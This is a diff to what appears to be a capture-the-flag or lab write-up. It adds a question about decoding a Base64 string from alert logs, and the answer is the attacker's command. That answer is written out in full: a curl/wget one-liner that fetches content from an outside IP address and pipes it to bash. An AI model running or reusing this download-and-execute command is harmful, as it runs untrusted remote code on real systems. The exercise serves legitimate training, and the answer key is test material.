@@ -999,3 +999,20 @@ I don't know why this is the answer, it is one of the many entries in the alert 
 > 62808 {.answer .blur} 
 
 [Reveal Answer](#) {.reveal-answer .btn .btn-primary}
+
+#### Question 7
+
+Investigate the log/alarm files.
+
+Decode the encoded command.
+
+What is the attacker's command?
+
+##### Notes
+
+The Base64 encoded string is part of the url in question 5 `KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=` it just needs decoding.
+
+#### Answer
+> (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash {.answer .blur} 
+
+[Reveal Answer](#) {.reveal-answer .btn .btn-primary}
